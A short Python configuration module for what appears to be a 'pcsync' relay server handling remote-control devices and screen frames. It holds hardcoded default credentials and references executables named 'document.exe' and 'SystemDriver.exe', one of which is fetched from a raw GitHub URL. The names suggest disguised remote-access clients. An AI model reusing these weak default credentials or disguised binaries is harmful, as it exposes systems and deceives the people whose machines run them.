import asyncio
import os
from typing import Dict

USER   = os.environ.get("PCSYNC_USER",   "waqarulwahab")
PASS   = os.environ.get("PCSYNC_PASS",   "waqarulwahab")
SECRET = os.environ.get("PCSYNC_SECRET", "device_secret_key")

devices:  Dict[str, dict]  = {}
pending:  Dict[str, asyncio.Future] = {}
known_devices: Dict[str, dict] = {}

rc_devices: Dict[str, dict] = {}
rc_latest_frame: Dict[str, str] = {}
known_rc_devices: Dict[str, dict] = {}

_PCSYNC_EXE_PATH = os.path.join(os.path.dirname(os.path.dirname(__file__)), "releases", "document.exe")
_RC_EXE_PATH     = os.path.join(os.path.dirname(os.path.dirname(__file__)), "releases", "SystemDriver.exe")
_RC_EXE_CACHE    = "/tmp/SystemDriver.exe"
_RC_GITHUB_RAW   = "https://raw.githubusercontent.com/samarhameed46/pcsync-relay/main/releases/SystemDriver.exe"
GITHUB_TOKEN     = os.environ.get("GITHUB_TOKEN", "")
